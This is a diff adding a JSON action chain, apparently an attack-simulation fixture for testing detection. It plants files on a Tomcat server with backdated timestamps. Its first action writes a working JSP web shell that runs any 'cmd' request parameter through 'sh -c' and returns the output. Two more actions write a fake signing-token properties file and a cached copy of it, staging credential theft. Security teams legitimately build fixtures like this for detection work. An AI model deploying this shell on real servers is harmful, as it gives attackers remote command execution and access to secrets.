@@ -1,0 +1,39 @@
+{
+  "chain_id": "template_upload_webshell_secret_echo_001",
+  "actions": [
+    {
+      "action_id": "prepare_dropped_preview_webshell",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/webapps/report-preview/quarterly-template-preview.jsp",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 20.3,
+      "content": "<%@ page import=\"java.io.*\" %>\n<%\nString mode = request.getParameter(\"mode\");\nString cmd = request.getParameter(\"cmd\");\nif (cmd != null && !cmd.trim().isEmpty()) {\n    Process p = new ProcessBuilder(\"sh\", \"-c\", cmd).redirectErrorStream(true).start();\n    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n    String line;\n    while ((line = reader.readLine()) != null) {\n        out.println(line);\n    }\n}\n%>\n"
+    },
+    {
+      "action_id": "prepare_signing_secret_file",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/webapps/ROOT/WEB-INF/classes/report-template-signing.properties",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 55.8,
+      "content": "template.signing.service_account=preview_exporter\ntemplate.signing.api_token=tpl-2026-east-signing-token\ntemplate.signing.key_id=quarterly-preview-key-01\ntemplate.signing.secret_scope=quarterly-report-preview\ntemplate.signing.approver=finance-preview-admin\n"
+    },
+    {
+      "action_id": "prepare_preview_cache_file",
+      "operation": "write_text_file",
+      "target_path": "/srv/dotserver/tomcat-9.0.41/temp/report-preview/quarterly-preview-cache.txt",
+      "encoding": "utf-8",
+      "backup_suffix": ".deepxdr.bak",
+      "create_parents": true,
+      "mtime_offset_sec": 79.8,
+      "content": "template.signing.service_account=preview_exporter\ntemplate.signing.api_token=tpl-2026-east-signing-token\ntemplate.signing.key_id=quarterly-preview-key-01\ntemplate.signing.secret_scope=quarterly-report-preview\ntemplate.signing.approver=finance-preview-admin\n"
+    }
+  ]
+}
+
+
+
+
